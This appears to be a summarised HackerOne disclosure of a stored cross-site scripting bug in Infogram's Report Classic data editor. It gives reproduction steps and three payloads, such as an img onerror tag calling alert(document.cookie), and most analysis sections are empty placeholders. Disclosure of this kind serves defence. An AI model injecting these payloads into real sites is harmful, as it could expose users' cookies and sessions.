# XSS on Report Classic

## Metadata
- **Source:** HackerOne
- **Report:** 282535 | https://hackerone.com/reports/282535
- **Submitted:** 2017-10-24
- **Reporter:** nihadrekanym
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Stored
- **CVEs:** None
- **Category:** web-api

## Summary
hi team ... 

i found XSS on https://infogram.com/app/#/library 

#step
..
1- go to https://infogram.com/app/#/library 
2- choose __Report Templates__ . 
3- Use __Report Classic__
4- click to __edit_data__
5- payload  
> <img/ src=1 onerror= alert(document.cookie)>
//#"><svg/onload=prompt(1)>
“><script>alert(document.cookie)</script>

6-execute XSS and which you edit data XSS stared


## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

hi team ... 

i found XSS on https://infogram.com/app/#/library 

#step
..
1- go to https://infogram.com/app/#/library 
2- choose __Report Templates__ . 
3- Use __Report Classic__
4- click to __edit_data__
5- payload  
> <img/ src=1 onerror= alert(document.cookie)>
//#"><svg/onload=prompt(1)>
“><script>alert(document.cookie)</script>

6-execute XSS and which you edit data XSS stared


</details>

---
*Analysed by Claude on 2026-05-24*
